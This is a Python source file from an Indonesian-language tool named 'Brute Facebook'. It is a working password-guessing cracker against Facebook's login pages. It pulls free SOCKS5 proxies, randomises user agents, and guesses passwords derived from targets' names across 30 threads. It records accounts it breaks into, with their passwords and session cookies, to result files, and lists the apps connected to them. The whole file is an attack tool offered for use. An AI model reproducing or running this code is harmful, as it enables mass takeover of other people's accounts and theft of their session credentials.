#######################################################
# Name           : Brute Facebook (BF)                #
# File           : log.py                             #
# Author         : Moch Yayan Juan Alvredo XD.        #
# Github         : https://github.com/Yayan-XD        #
# Facebook       : https://www.facebook.com/KM39453   #
# Website        : https://www.yayanxd.my.id          #
# Python version : 0.4                                #
#######################################################

############# DON'T REMOVE THIS FUNCTIONS #############

import requests, re, random, datetime, time
from concurrent.futures import ThreadPoolExecutor as Modol
from bs4 import BeautifulSoup as par
from data import selesai as jg
from datetime import datetime
#---- MODULE RICH IN PYTHON -------
from rich import print as prints
from rich.panel import Panel
from rich.tree import Tree
#---- PROGRES ------
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
# --- BULAN --------
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ha = current.day
op = bulan[nTemp]
ta = current.year
#------------------------------->
M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
H = '\x1b[1;92m' # HIJAU
N = '\x1b[0m'    # WARNA MATI
#------------------------------->
merah  = '[#FF0022]'
hijau  = '[#00FF33]'
hapus  = '[/]'
biru_m = '[bold cyan]'
###########################################################################################
class Brute_crack:

    def __init__(self, oz):
        self.id, self.apk, self.ok, self.uas, self.met, self.cp, self.loop = [], [], [], [], [], [], 0
        self.id = oz
        self.proxx()
        self.plerr()
    # ------- METODE --------
    def mentod(self):
        prints(Panel(f"""[{biru_m}1{hapus}] method API (fast)
[{biru_m}2{hapus}] method mbasic (slow)
[{biru_m}3{hapus}] method mobile (super slow) [[green] Disarankan [/]]""",title="[green]METODE LOGIN[/]"))
    # ------- NAMPILKAN APLIKASI --------
    def tampilkan_apk(self):
        prints(Panel("menampilkan aplikasi maka akun akan mudah terkena chekpoint dikarenakan memakai module requests berlebihan. tidak di sarankan untuk menampilkan apilkasi."))
        crot = input(f"  [{M}?{N}] ingin menampilkan aplikasi yang terkait [Y/t]: ")
        if crot in[""]:
            print(f"  [{M}!{N}] jangan kosong");self.tampilkan_apk()
        elif crot in["Y","y"]:
            self.apk.append("y")
        elif crot in["T","t"]:
            self.apk.append("t")
        else:
            print(f"  [{M}!{N}] y/t bro");self.tampilkan_apk()
    # ------- UA RANDOM ----------------
    def kentod(self, integer):
        lis = list("1234567890")
        gets = [random.choice(lis) for _ in range(integer)]
        return "".join(gets).upper()
    # ------- INGFO --------
    def ingfo(self):
        prints(Panel(f"""[{biru_m}+{hapus}] hasil OK disimpan ke -> results/OK-{ha}-{op}-{ta}.txt
[{biru_m}+{hapus}] hasil CP disimpan ke -> results/CP-{ha}-{op}-{ta}.txt

[{merah}×{hapus}] hidupkan mode pesawat 2 detik jika tidak ada hasil."""))
    # ------- PROXY --------
    def proxx(self):
        try:
            prox=requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
            open('data/prox.txt','w').write(prox)
        except Exception as e:
            exit(e)
    # ------- SETTING USER AGENT --------
    def ua_set(self):
        try:
            self.uas = open("data/ua.txt", "r").read().splitlines()
        except FileNotFoundError:
            try:
                iajsndbb = open("data/ua_ran.txt", "r").read().splitlines()
                self.uas = random.choice(iajsndbb)
            except FileNotFoundError:
                rr = random.randint
                rc = random.choice
                aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
                self.uas = (f"Mozilla/5.0 (Linux; U; Android {str(rr(2,12))}.{str(rr(2,9))}.{str(rr(2,10))}; en-gb; NEO-X5-116A Build/{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 [FBAN/EMA;FBBV/382118484;FBAV/311.0.0.7.114;FBDV/SM-A107F;FBLC/id_ID;FBNG/4G;FBMNT/METERED;FBDM]/{str(rr(20,50))}.608.27.0")

        return self.uas
    # ------- GANTI BAHASA --------
    def language(self, cok):
        ses=requests.Session()
        try: 
            url = ses.get('https://mbasic.facebook.com/language/',cookies=cok)
            data = par(url.text,'html.parser')
            for x in data.find_all('form',{'method':'post'}):
                if 'Bahasa Indonesia' in str(x):
                    bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "Bahasa Indonesia"}
                    ses.post('https://mbasic.facebook.com' + x['action'],data=bahasa,cookies=cok)
        except:pass
    # ------- PILIH PASSWORD --------
    def plerr(self):
        prints(Panel(f"""Jika anda memilih kata sandi manual, maka system ngedeted password inputan anda sendiri.
atau bisa juga menggunakan kata sandi otomatis [{hijau}password bawaan script{hapus}]"""))
        ___yayanganteng___ = input(f"  [{O}?{N}] apakah anda ingin menggunakan kata sandi manual? [Y/t]: ")
        if ___yayanganteng___ in ["y","Y"]:
            self.tampilkan_apk()
            prints(Panel("[[bold red]![/]] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih"))
            while True:
                pwek = input(f"  [{O}?{N}] masukan kata sandi : ")
                prints(Panel(f"[{biru_m}*[/]] crack dengan sandi -> [ [bold red]{pwek}[/] ]"))
                if pwek in[""," "]:
                    print(f"  {N}[{M}×{N}] jangan kosong bro kata sandi nya")
                elif len(pwek)<=5:
                    print(f"  {N}[{M}×{N}] kata sandi minimal 6 karakter")
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        global prog,des
                        cin = input(f"  [{O}*{N}] method : ")
                        if cin in[""," "]:
                            print(f"  {N}[{M}×{N}] jangan kosong bro");__yan__()
                        elif cin in["1","01"]:
                            self.ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.id))
                            with prog:
                                with Modol(max_workers=30) as bool:
                                    for i in self.id:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            bool.submit(self.__metode__, kimochi, ysc, "free.facebook.com")
                                        except:pass
                            jg.Selesai_crack(self.ok, self.cp)
                        elif cin in["2","02"]:
                            self.ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.id))
                            with prog:
                                with Modol(max_workers=30) as bool:
                                    for i in self.id:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            bool.submit(self.__metode__, kimochi, ysc, "mbasic.facebook.com")
                                        except:pass
                            jg.Selesai_crack(self.ok, self.cp)
                        elif cin in["3","03"]:
                            self.ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.id))
                            with prog:
                                with Modol(max_workers=30) as bool:
                                    for i in self.id:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            bool.submit(self.__metode__, kimochi, ysc, "m.facebook.com")
                                        except:pass
                            jg.Selesai_crack(self.ok, self.cp)
                        else:
                            print(f"  {N}[{M}!{N}] input yang bener");__yan__()
                    self.mentod()
                    __yan__(pwek.split(","))
                    break
        elif ___yayanganteng___ in ["t","T"]:
            self.tampilkan_apk()
            self.mentod()
            self.__pler__()
        else:
            print(f"  [{M}!{N}] y/t bro");self.plerr()
    ###---[ CONVERT COOKIE ]---###
    def ngoxok(self,cooz):
        coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
        return(str(coki))
    # ------- METODE LOGIN --------
    def __metode__(self, user, pasw, cebok):
        prog.update(des,description=f"{str(self.loop)}/{len(self.id)} OK-:[bold green]{len(self.ok)}[/] CP-:[bold yellow]{len(self.cp)}[/]")
        prog.advance(des)
        rr = open("data/ua.txt", "r").read().splitlines()
        uaa=random.choice(rr)
        for pw in pasw:
            try:
                ssiidi = open("data/prox.txt","r").read().splitlines()
                jsndww = {"http": f"socks5://{random.choice(ssiidi)}"}
                session=requests.Session()
                head1 = {
                    "Host": cebok,
                    "upgrade-insecure-requests": "1",
                    "user-agent": uaa,
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt": "1",
                    "x-requested-with": "com.facebook.katana",
                    "sec-fetch-site": "none",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-user": "?1",
                    "sec-fetch-dest": "document",
                    "referer": f"https://{cebok}/?stype=lo&jlou=AfdK3CIAe4G0VoToF0G-kATZuEgZYH6i6s6FvO1HSCCULl-AUg2ngZOFKmM5TxGdQaGEnSZn90EGj6yKrwP1xCvoLWeI-UkjOVjkEwF3mhaJvg&smuh=35131&lh=Ac-IJQmuKcHcKuufteQ&refid=8&ref_component=mbasic_footer&_rdr",
                    "accept-encoding": "gzip, deflate",
                    "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
                }
                link = session.get(f"https://{cebok}/login.php?skip_api_login=1&api_key=2248752618779321&kid_directed_site=0&app_id=2248752618779321&signed_next=1&next=https%3A%2F%2F{cebok}%2Fdialog%2Foauth%3Fclient_id%3D2248752618779321%26redirect_uri%3Dhttps%253A%252F%252Fauth.kode.id%252Fsignin%26state%3Dfacebookdirect%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26response_type%3Dcode%26auth_type%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De6017cfb-ff17-4926-bc25-73bdb899c974%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.kode.id%2Fsignin%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfacebookdirect%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",headers=head1).text
                date = {"lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"',str(link)).group(1), "m_ts": re.search('name="m_ts" value="(.*?)"',str(link)).group(1), "li": re.search('name="li" value="(.*?)"',str(link)).group(1), "try_number": "0", "unrecognized_tries": "0", "email": user, "pass": pw}
                head2 = {
                    "Host": cebok,
                    "content-length": "1737",
                    "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1),
                    "user-agent": uaa,
                    "content-type": "application/x-www-form-urlencoded",
                    "accept": "*/*",
                    "origin": f"https://{cebok}",
                    "x-requested-with": "com.facebook.katana",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": f"https://{cebok}/login.php?skip_api_login=1&api_key=2248752618779321&kid_directed_site=0&app_id=2248752618779321&signed_next=1&next=https%3A%2F%2F{cebok}%2Fdialog%2Foauth%3Fclient_id%3D2248752618779321%26redirect_uri%3Dhttps%253A%252F%252Fauth.kode.id%252Fsignin%26state%3Dfacebookdirect%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26response_type%3Dcode%26auth_type%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De6017cfb-ff17-4926-bc25-73bdb899c974%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.kode.id%2Fsignin%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfacebookdirect%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
                    "accept-encoding": "gzip, deflate",
                    "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
                }
                bz = session.post(f"https://{cebok}/login/device-based/login/async/?api_key=2248752618779321&auth_token=a8f9ed7f10d5641dd44ce32bcf7e8801&skip_api_login=1&signed_next=1&next=https%3A%2F%2F{cebok}%2Fdialog%2Foauth%3Fclient_id%3D2248752618779321%26redirect_uri%3Dhttps%253A%252F%252Fauth.kode.id%252Fsignin%26state%3Dfacebookdirect%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26response_type%3Dcode%26auth_type%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De6017cfb-ff17-4926-bc25-73bdb899c974%26tp%3Dunspecified%26cbt%3D1659944474645&refsrc=deprecated&app_id=2248752618779321&cancel=https%3A%2F%2Fauth.kode.id%2Fsignin%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfacebookdirect%23_%3D_&lwv=101",data=date,headers=head2, proxies=jsndww, allow_redirects=False)
                if "c_user" in session.cookies.get_dict():
                    digi = random.choice([2])
                    digi = self.kentod(digi)
                    coki = self.ngoxok(session.cookies.get_dict())
                    user = re.findall('c_user=(.*);xs', coki)[0]
                    if "y" in self.apk:
                        self.cek_apk(user, pw, coki, digi)
                    elif "t" in self.apk:
                        tree = Tree("")
                        tree.add(f"[bold green]{user}|{pw}").add(f"[bold green]{coki}ua={digi}")
                        prints(tree)
                    wrt = " [✓] "+user+"|"+pw+"|"+coki
                    self.ok.append(wrt)
                    with open(f"results/OK/OK-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as r:
                        r.write(wrt+"\n")
                    break
                elif "checkpoint" in session.cookies.get_dict():
                    user = session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                    tree = Tree("")
                    tree.add(f"[bold yellow]{user}|{pw}")
                    prints(tree)
                    wrt = " [×] "+user+"|"+pw
                    self.cp.append(wrt)
                    with open(f"results/CP/CP-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as w:
                        w.write(wrt+"\n")
                    break
                else:
                    continue
            except requests.exceptions.ConnectionError:
               time.sleep(5)
        self.loop+=1
    # ------- MENGECEK APLIKASI --------
    def cek_apk(self, user, pw, cok, ahh):
        cookie = {"cookie":cok}
        self.language(cookie)
        tree = Tree("                                ")
        tree.add(f"[bold green]{user}|{pw}|[bold green]{cok};ua={ahh}")
        try:
            active = Tree(f"\r{hijau}Aplikasi aktif :")
            url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
            self.get_active(url,active,cookie)
        except Exception as e:
            prints(e)
        try:
            inactive = Tree(f"\r{merah}Aplikasi kadaluarsa :")
            url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
            self.get_inactive(url,inactive,cookie)
        except Exception as e:
            prints(e)
        tree.add(active)
        tree.add(inactive)
        prints(tree)

    def get_active(self,url,active,cookie):
        ses=requests.Session()
        try:
            data = par(ses.get(url,cookies=cookie).text,"html.parser")
            for apk in data.find_all("h3"):
                if "Ditambahkan" in apk.text:
                    active.add(f"\r{H}{str(apk.text).replace('Ditambahkan',f' {N}- Ditambahkan')}{N}")
                else:continue
            next = "https://mbasic.facebook.com" + data.find("a",string="Lihat Lainnya")["href"]
            self.get_active(next,active,cookie)
        except:pass

    def get_inactive(self,url,inactive,cookie):
        ses=requests.Session()
        try:
            data = par(ses.get(url,cookies=cookie).text,"html.parser")
            for apk in data.find_all("h3"):
                if "Kedaluwarsa" in apk.text:
                    inactive.add(f"\r{M}{str(apk.text).replace('Kedaluwarsa',f' {N}- Kedaluwarsa')}{N}")
                else:continue
            next = "https://mbasic.facebook.com" + data.find("a",string="Lihat Lainnya")["href"]
            self.get_inactive(next,inactive,cookie)
        except:pass

    # ------- METODE PILIHAN --------
    def __pler__(self):
        yan = input(f"  [{O}*{N}] method : ")
        if yan in [""," "]:
            print(f"  {N}[{M}×{N}] jangan kosong bro");self.__pler__()
        elif yan in ["01","1"]:
            self.met.append("free")
            self.progg()
        elif yan in ["2","02"]:
            self.met.append("mbasic")
            self.progg()
        elif yan in ["3","03"]:
            self.met.append("mobile")
            self.progg()
        else:
            print(f"  {N}[{M}×{N}] input yang bener");self.__pler__()
    # ------- PROGRESS ------------
    def progg(self):
        self.ingfo()
        global prog,des
        prog = Progress(SpinnerColumn('smiley'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
        des = prog.add_task('',total=len(self.id))
        with prog:
            with Modol(max_workers=30) as bool:
                for user in self.id:
                    pwx = []
                    uid  = user.split("<=>")[0]
                    nama = user.split("<=>")[1].lower()
                    depan = nama.split(" ")[0]
                    if len(nama)<=5:
                        if len(depan)<3:
                            pass
                        else:
                            pwx.append(depan+"123")
                            pwx.append(depan+"12345")
                    else:
                        if len(depan)<3:
                            pwx.append(nama)
                        else:
                            pwx.append(nama)
                            pwx.append(depan+"123")
                            pwx.append(depan+"12345")
                    if "free" in self.met:
                        bool.submit(self.__metode__, uid, pwx, "free.facebook.com")
                    elif  "mbasic" in self.met:
                        bool.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    elif  "mobile" in self.met:
                        bool.submit(self.__metode__, uid, pwx, "m.facebook.com")
                    else:
                        bool.submit(self.__metode__, uid, pwx, "m.facebook.com")
        jg.Selesai_crack(self.ok, self.cp)
